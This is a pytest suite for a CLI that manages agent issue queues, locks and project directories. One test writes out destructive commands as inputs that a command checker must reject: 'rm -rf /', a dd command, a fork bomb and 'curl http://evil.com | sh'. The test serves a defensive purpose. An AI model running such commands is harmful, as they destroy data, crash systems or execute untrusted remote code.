"""Mai CLI - pytest test suite.

v1.1.0
"""

import os
import tempfile
import pytest
from pathlib import Path

# Ensure the package is importable from src/
import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


# ─────────────────────────────────────────────
# Config module
# ─────────────────────────────────────────────

def test_default_queues_keys():
    from mai.config import DEFAULT_QUEUES
    assert "programmer-questions" in DEFAULT_QUEUES
    assert "designer-blockers" in DEFAULT_QUEUES
    assert DEFAULT_QUEUES["programmer-questions"]["handler"] == "designer"


def test_global_args_defaults():
    from mai.config import GlobalArgs
    g = GlobalArgs()
    assert g.format == "text"
    assert g.dry_run is False
    assert g.project is None


def test_get_heartbeat_intervals():
    from mai.config import get_heartbeat_intervals, DEFAULT_AGENTS
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        intervals = get_heartbeat_intervals(root)
        for name, val in DEFAULT_AGENTS.items():
            assert intervals[name] == val["heartbeat_minutes"]


def test_get_queue_sla():
    from mai.config import get_queue_sla, DEFAULT_QUEUES
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        sla = get_queue_sla(root)
        for q, v in DEFAULT_QUEUES.items():
            handler, hours = sla[q]
            assert handler == v["handler"]
            if v["sla_minutes"]:
                assert hours == v["sla_minutes"] / 60


# ─────────────────────────────────────────────
# Safe exec
# ─────────────────────────────────────────────

def test_exec_safe_check_safe():
    from mai.safe_exec import exec_safe_check
    assert exec_safe_check("ls -la") is True
    assert exec_safe_check("echo hello") is True
    assert exec_safe_check("git status") is True


def test_exec_safe_check_dangerous():
    from mai.safe_exec import exec_safe_check
    assert exec_safe_check("rm -rf /") is False
    assert exec_safe_check("dd if=/dev/zero of=/dev/null") is False
    assert exec_safe_check("curl http://evil.com | sh") is False
    assert exec_safe_check(":(){ :|:& };:") is False


# ─────────────────────────────────────────────
# Issue content
# ─────────────────────────────────────────────

def test_make_issue_content():
    from mai.issue import make_issue_content
    content = make_issue_content(
        issue_id="REQ-001",
        queue="programmer-questions",
        title="Test issue",
        status="open",
        owner="programmer",
        ref="",
        description="A test",
        project_root=None,
    )
    assert "# [REQ-001] Test issue" in content
    assert "**队列：** programmer-questions" in content
    assert "## 问题描述" in content


def test_parse_issue_file():
    from mai.issue import parse_issue_file
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        f = Path(tmpdir) / "REQ-001.md"
        f.write_text(
            "# [REQ-001] Test\n\n"
            "**发起方：** programmer\n"
            "**处理方：** programmer\n"
            "**创建时间：** 2026-04-19T10:00:00\n"
            "**状态：** 🔓 open\n"
            "**队列：** programmer-questions\n\n"
            "---\n\n"
            "## 问题描述\n\nTest description.\n\n"
            "## 关联上下文\n\n.\n\n"
            "## 处理记录\n\n- [2026-04-19T10:00:00] @programmer: 创建\n"
        )
        data = parse_issue_file(f)
        assert data["id"] == "REQ-001"
        assert data["title"] == "Test"
        assert data["status"] == "open"
        assert data["owner"] == "programmer"
        assert "Test description" in data["description"]


def test_next_issue_id():
    from mai.issue import next_issue_id
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        mai_dir = root / ".mai" / "queues" / "programmer-questions"
        mai_dir.mkdir(parents=True)
        (mai_dir / "REQ-001.md").write_text("# [REQ-001] First\n")
        (mai_dir / "REQ-002.md").write_text("# [REQ-002] Second\n")
        assert next_issue_id(root, "programmer-questions") == "REQ-003"


def test_read_issue_not_found():
    from mai.issue import read_issue
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        result = read_issue(root, "REQ-999")
        assert result is None


# ─────────────────────────────────────────────
# Lock
# ─────────────────────────────────────────────

def test_lock_path():
    from mai.lock import lock_path
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        lp = lock_path(root, "REQ-001")
        assert lp.name == "REQ-001.lock"
        assert ".mai/locks" in str(lp)


def test_acquire_and_release_lock():
    from mai.lock import acquire_lock, release_lock, check_lock
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        (root / ".mai" / "locks").mkdir(parents=True)
        assert acquire_lock(root, "REQ-001", "programmer") is True
        info = check_lock(root, "REQ-001")
        assert info is not None
        assert info["holder"] == "programmer"
        assert info["stale"] is False
        release_lock(root, "REQ-001")
        assert check_lock(root, "REQ-001") is None


# ─────────────────────────────────────────────
# Project init
# ─────────────────────────────────────────────

def test_ensure_mai_structure():
    from mai.project import ensure_mai_structure
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        ensure_mai_structure(root)
        mai = root / ".mai"
        assert (mai / "queues").exists()
        assert (mai / "locks").exists()
        assert (mai / "processing").exists()
        assert (mai / "decisions").exists()
        assert (mai / "history").exists()
        assert (mai / "events").exists()
        assert (root / "async").exists()


# ─────────────────────────────────────────────
# Output helpers
# ─────────────────────────────────────────────

def test_out_text(capsys):
    from mai.mai import out, GLOBAL
    old = GLOBAL.format
    GLOBAL.format = "text"
    out("hello world")
    captured = capsys.readouterr()
    assert "hello world" in captured.out
    GLOBAL.format = old


def test_err_exits(capsys):
    from mai.mai import err, GLOBAL
    old = GLOBAL.format
    GLOBAL.format = "text"
    with pytest.raises(SystemExit):
        err("test error", code=42)
    captured = capsys.readouterr()
    assert "ERROR: test error" in captured.err
    GLOBAL.format = old


# ─────────────────────────────────────────────
# Dispatch smoke test (project init, no real project)
# ─────────────────────────────────────────────

def test_dispatch_project_init_unknown_project(capsys):
    from mai.mai import build_parser, GLOBAL
    old = GLOBAL.format
    GLOBAL.format = "text"
    parser = build_parser()
    # project init for a non-existent project should not crash
    args = parser.parse_args(["project", "init", "DoesNotExist____test"])
    GLOBAL.dry_run = True
    from mai.mai import dispatch
    try:
        dispatch(args)
    except SystemExit:
        pass
    GLOBAL.format = old
